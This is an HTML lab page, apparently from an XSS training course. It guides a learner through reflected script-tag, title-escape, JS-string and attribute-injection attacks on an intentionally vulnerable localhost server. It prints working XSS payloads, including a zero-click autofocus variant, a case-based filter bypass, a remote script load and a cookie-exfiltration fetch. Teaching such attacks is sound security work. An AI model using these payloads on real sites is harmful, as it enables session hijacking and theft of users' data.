@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attack 01 — Script Tag Injection | XSS Mastery</title>
+  <style>
+    :root {
+      --bg:#0b0f1a;--card:#141c2e;--border:#1e3a5f;--gold:#f5c842;
+      --cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;--green:#4ade80;
+      --orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;
+         padding:24px;max-width:960px;margin:0 auto}
+    h1{font-size:24px;color:var(--gold);margin-bottom:6px}
+    h2{font-size:16px;color:var(--cyan);margin:0 0 10px}
+    p{color:var(--muted);font-size:13.5px;line-height:1.65;margin-bottom:10px}
+    a{color:var(--cyan)}
+    code{font-family:'Courier New',monospace;font-size:12px;background:var(--code-bg);
+         color:var(--cyan);padding:2px 5px;border-radius:3px;border:1px solid var(--border)}
+    pre{background:var(--code-bg);border:1px solid var(--border);border-radius:5px;
+        padding:12px;font-size:12.5px;white-space:pre-wrap;word-break:break-all;
+        color:var(--orange);margin:8px 0;font-family:'Courier New',monospace}
+
+    .section{background:var(--card);border:1px solid var(--border);
+             border-radius:8px;padding:20px;margin-bottom:16px}
+    .section-header{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+    .step-badge{background:var(--border);color:var(--cyan);font-size:11px;
+                font-weight:700;padding:3px 9px;border-radius:12px}
+    .payload-grid{display:grid;grid-template-columns:1fr auto;gap:8px;
+                  align-items:start;margin:8px 0}
+    .payload-grid pre{margin:0}
+    .btn{padding:7px 14px;border:none;border-radius:4px;cursor:pointer;
+         font-size:12px;font-weight:700;white-space:nowrap}
+    .btn-test{background:var(--cyan);color:#0b0f1a}
+    .btn-test:hover{background:#7dd3fc}
+    .btn-copy{background:var(--border);color:var(--text)}
+    .btn-copy:hover{background:#2a4a7f}
+    .result-box{background:#060d1a;border:1px solid var(--border);border-radius:4px;
+                padding:10px;margin-top:8px;min-height:28px;font-size:13px;
+                transition:border-color .2s}
+    .result-box.fired{border-color:var(--green);color:var(--green)}
+    .result-box.blocked{border-color:var(--red);color:var(--red)}
+    .note{font-size:12px;color:var(--muted);border-left:3px solid var(--purple);
+          padding:6px 10px;margin-top:8px;line-height:1.55}
+    .context-badge{font-size:10px;font-weight:700;letter-spacing:.08em;
+                   text-transform:uppercase;padding:2px 7px;border-radius:3px;margin-left:6px}
+    .ctx-body{background:#1f2f10;color:var(--green)}
+    .ctx-attr{background:#10202f;color:var(--cyan)}
+    .ctx-script{background:#2f1f10;color:var(--orange)}
+    .ctx-dom{background:#2f102f;color:var(--purple)}
+    .warning{background:#1f0f0f;border:1px solid var(--red);border-radius:5px;
+             padding:10px 14px;font-size:13px;color:#fca5a5;margin-bottom:14px}
+    .success-banner{background:#0a1f13;border:1px solid var(--green);border-radius:5px;
+                    padding:10px 14px;font-size:13px;color:var(--green);
+                    display:none;margin-top:8px}
+    table{width:100%;border-collapse:collapse;font-size:13px;margin-top:10px}
+    th{background:#111827;color:var(--cyan);padding:8px 12px;text-align:left;
+       border-bottom:1px solid var(--border)}
+    td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+    tr:last-child td{border-bottom:none}
+  </style>
+</head>
+<body>
+
+  <p style="margin-bottom:14px"><a href="/">← Lab Home</a></p>
+  <h1>Attack 01 — Script Tag Injection (Mechanism 1)</h1>
+  <p style="font-size:14px;margin-bottom:18px">
+    Module 04 · Use this page alongside the tutorial.
+    Start your lab server, then work through each section in order.
+    Keep DevTools Console and Network panels open.
+  </p>
+
+  <div class="warning">
+    ⚠ The lab server endpoints used here are <strong>intentionally vulnerable</strong>.
+    They exist solely for controlled study. Never deploy this server beyond localhost.
+  </div>
+
+  <!-- ── Section 1: Confirm the reflection ──────────────────────────────── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="step-badge">STEP 1</span>
+      <h2>Confirm the Injection Point<span class="context-badge ctx-body">Body Context</span></h2>
+    </div>
+    <p>
+      First, confirm that the server reflects your input unchanged.
+      Send benign HTML and verify it renders. This is always the first
+      step in manual XSS testing — prove the reflection before escalating.
+    </p>
+
+    <div class="payload-grid">
+      <pre>&lt;b&gt;hello from injection&lt;/b&gt;</pre>
+      <div style="display:flex;gap:6px">
+        <button class="btn btn-test" onclick="testReflect(this,'%3Cb%3Ehello+from+injection%3C/b%3E','s1')">Test in new tab</button>
+        <button class="btn btn-copy" onclick="copyURL('/search?q=%3Cb%3Ehello+from+injection%3C/b%3E')">Copy URL</button>
+      </div>
+    </div>
+    <div class="result-box" id="s1">Click "Test in new tab" → verify bold text appears in the page</div>
+    <div class="note">
+      If bold text renders, the server is reflecting your HTML raw into the page body.
+      Open DevTools Elements panel on the /search page and find the injected
+      <code>&lt;b&gt;</code> element in the DOM tree.
+    </div>
+  </div>
+
+  <!-- ── Section 2: Script tag — body context ───────────────────────────── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="step-badge">STEP 2</span>
+      <h2>Script Tag — Body Context<span class="context-badge ctx-body">Body Context</span></h2>
+    </div>
+    <p>
+      Now escalate. Inject a <code>&lt;script&gt;</code> tag. The server
+      reflects it directly into the HTML body, the browser parses it,
+      and the script executes at parse time — before the page finishes loading.
+    </p>
+
+    <div class="payload-grid">
+      <pre>&lt;script&gt;alert(document.domain)&lt;/script&gt;</pre>
+      <button class="btn btn-test" onclick="openReflect('/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E')">Open in tab</button>
+    </div>
+    <div class="note">
+      <strong>What to observe:</strong> The alert fires immediately on page load —
+      you typed nothing, clicked nothing on the victim page. The origin shown is
+      <code>localhost</code>. In a real attack this would be the target domain,
+      and the payload would exfiltrate cookies instead of showing an alert.
+    </div>
+
+    <div class="payload-grid" style="margin-top:12px">
+      <pre>&lt;script&gt;fetch('http://localhost:5000/ping?stolen='+document.cookie)&lt;/script&gt;</pre>
+      <button class="btn btn-test" onclick="openReflect('/search?q=%3Cscript%3Efetch(%27http://localhost:5000/ping%3Fstolen%3D%27%2Bdocument.cookie)%3C/script%3E')">Open in tab</button>
+    </div>
+    <div class="note">
+      <strong>Realistic exfiltration payload:</strong> This sends the page's
+      cookies to an attacker-controlled endpoint as a URL parameter.
+      Watch the Network panel — you will see the /ping request with
+      <code>?stolen=</code> in the URL. In Module 15, the callback_server
+      captures these.
+    </div>
+  </div>
+
+  <!-- ── Section 3: Breaking out of other contexts first ───────────────── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="step-badge">STEP 3</span>
+      <h2>Breaking Out of Title/Style to Reach Script<span class="context-badge ctx-body">Context Escape → Body</span></h2>
+    </div>
+    <p>
+      Many vulnerabilities don't place your input in the body — they place it
+      inside a <code>&lt;title&gt;</code>, <code>&lt;style&gt;</code>,
+      or another tag. The technique is the same: close the enclosing element,
+      then inject your script tag.
+    </p>
+
+    <div class="payload-grid">
+      <pre>&lt;/title&gt;&lt;script&gt;alert('escaped title context')&lt;/script&gt;</pre>
+      <button class="btn btn-test" onclick="openReflect('/search?q=%3C/title%3E%3Cscript%3Ealert(%27escaped+title+context%27)%3C/script%3E')">Open in tab</button>
+    </div>
+    <div class="note">
+      The <code>&lt;/title&gt;</code> closes the page's title block. Everything
+      after it is in the body context. The script tag now executes normally.
+      Open View Source (Ctrl+U) to see where your injection lands in the raw HTML.
+    </div>
+  </div>
+
+  <!-- ── Section 4: Attribute context ──────────────────────────────────── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="step-badge">STEP 4</span>
+      <h2>Script Context Injection (JS String Escape)<span class="context-badge ctx-script">Script Context</span></h2>
+    </div>
+    <p>
+      When input lands inside a <code>&lt;script&gt;</code> block as a string
+      value, the attacker breaks out of the JS string with a quote, then injects
+      arbitrary JavaScript. The <code>//</code> at the end comments out the
+      remainder of the original line to prevent syntax errors.
+    </p>
+
+    <div class="payload-grid">
+      <pre>";alert(document.domain);//</pre>
+      <button class="btn btn-test" onclick="openReflect('/search-js?q=%22;alert(document.domain);//')">Open in tab</button>
+    </div>
+    <div class="note">
+      The server embeds your input into:
+      <code>var searchQuery = "[INPUT]";</code>
+      Your payload closes the string (<code>"</code>), ends the statement (<code>;</code>),
+      executes alert, then comments out the rest (<code>;//</code>).
+      Result: <code>var searchQuery = "";alert(document.domain);//";</code>
+    </div>
+
+    <div class="payload-grid" style="margin-top:12px">
+      <pre>";</p>
+&lt;/script&gt;&lt;script&gt;alert('tag break from script context')&lt;/script&gt;&lt;p&gt;</pre>
+      <button class="btn btn-test" onclick="openReflect('/search-js?q=%22%3B%3C/script%3E%3Cscript%3Ealert(%27tag+break%27)%3C/script%3E%3Cp%3E')">Open in tab</button>
+    </div>
+    <div class="note">
+      Alternative: close the entire <code>&lt;/script&gt;</code> block with
+      the literal sequence <code>&lt;/script&gt;</code> — the HTML parser
+      responds to this even inside a JS string. A new script block is opened.
+      This is why you must NEVER embed user data in <code>&lt;script&gt;</code>
+      blocks via string concatenation.
+    </div>
+  </div>
+
+  <!-- ── Section 5: Attribute context break ────────────────────────────── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="step-badge">STEP 5</span>
+      <h2>Attribute Break — No Angle Brackets Needed<span class="context-badge ctx-attr">Attribute Context</span></h2>
+    </div>
+    <p>
+      When input lands inside an HTML attribute value, the attacker doesn't need
+      <code>&lt;</code> or <code>&gt;</code> at all. A <code>"</code> closes the
+      attribute, and then a new attribute (like an event handler) can be added.
+    </p>
+
+    <div class="payload-grid">
+      <pre>" onmouseover="alert(document.domain)" x="</pre>
+      <button class="btn btn-test" onclick="openReflect('/search-attr?q=%22+onmouseover%3D%22alert(document.domain)%22+x%3D%22')">Open in tab</button>
+    </div>
+    <div class="note">
+      The server produces: <code>&lt;input value="" onmouseover="alert(document.domain)" x=""&gt;</code>.
+      Hover over the input box on the resulting page — the alert fires.
+      The trailing <code>x="</code> absorbs the original closing <code>"</code>
+      so the HTML remains syntactically valid. Open View Source to see this clearly.
+    </div>
+
+    <div class="payload-grid" style="margin-top:12px">
+      <pre>" autofocus onfocus="alert(document.domain)</pre>
+      <button class="btn btn-test" onclick="openReflect('/search-attr?q=%22+autofocus+onfocus%3D%22alert(document.domain)')">Open in tab</button>
+    </div>
+    <div class="note">
+      <strong>Zero-interaction version:</strong> <code>autofocus</code> causes
+      the browser to focus the input immediately on page load, triggering
+      <code>onfocus</code> without any user action. This is a full zero-click
+      payload delivered via attribute injection.
+    </div>
+  </div>
+
+  <!-- ── Section 6: Payload mutation table ─────────────────────────────── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="step-badge">REFERENCE</span>
+      <h2>Script Tag Payload Variants — All Three Contexts</h2>
+    </div>
+    <p>Each row below is a different variant. Test each in the appropriate endpoint.</p>
+    <table>
+      <thead>
+        <tr>
+          <th>Payload</th>
+          <th>Context</th>
+          <th>Endpoint</th>
+          <th>Why it works</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+          <td>Body</td>
+          <td><code>/search</code></td>
+          <td>Direct script tag in body context. Parsed and executed at load time.</td>
+        </tr>
+        <tr>
+          <td><code>&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></td>
+          <td>Body</td>
+          <td><code>/search</code></td>
+          <td>HTML tag names are case-insensitive. Bypasses filters checking for lowercase only.</td>
+        </tr>
+        <tr>
+          <td><code>&lt;script src=//localhost:5000/ping&gt;&lt;/script&gt;</code></td>
+          <td>Body</td>
+          <td><code>/search</code></td>
+          <td>Remote script load. Payload lives off-site; injection string is tiny and has no JS keywords.</td>
+        </tr>
+        <tr>
+          <td><code>&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+          <td>Title escape → Body</td>
+          <td><code>/search</code></td>
+          <td>Closes the title element first. Any block-level element can be escaped this way.</td>
+        </tr>
+        <tr>
+          <td><code>";alert(1);//</code></td>
+          <td>Script</td>
+          <td><code>/search-js</code></td>
+          <td>Breaks out of JS string, executes inline. Comments out trailing code.</td>
+        </tr>
+        <tr>
+          <td><code>" onmouseover="alert(1)" x="</code></td>
+          <td>Attribute</td>
+          <td><code>/search-attr</code></td>
+          <td>Closes attribute value, adds event handler. No angle brackets.</td>
+        </tr>
+        <tr>
+          <td><code>" autofocus onfocus="alert(1)</code></td>
+          <td>Attribute</td>
+          <td><code>/search-attr</code></td>
+          <td>Zero-interaction: autofocus triggers onfocus immediately on page load.</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <script>
+    function openReflect(url) {
+      window.open(url, '_blank');
+    }
+    function testReflect(btn, encoded, resultId) {
+      window.open('/search?q=' + encoded, '_blank');
+      document.getElementById(resultId).textContent =
+        'Opened in new tab — check that bold text rendered on the /search page.';
+      document.getElementById(resultId).className = 'result-box fired';
+    }
+    function copyURL(url) {
+      navigator.clipboard.writeText('http://localhost:5000' + url)
+        .then(() => alert('URL copied to clipboard'));
+    }
+  </script>
+
+</body>
+</html>
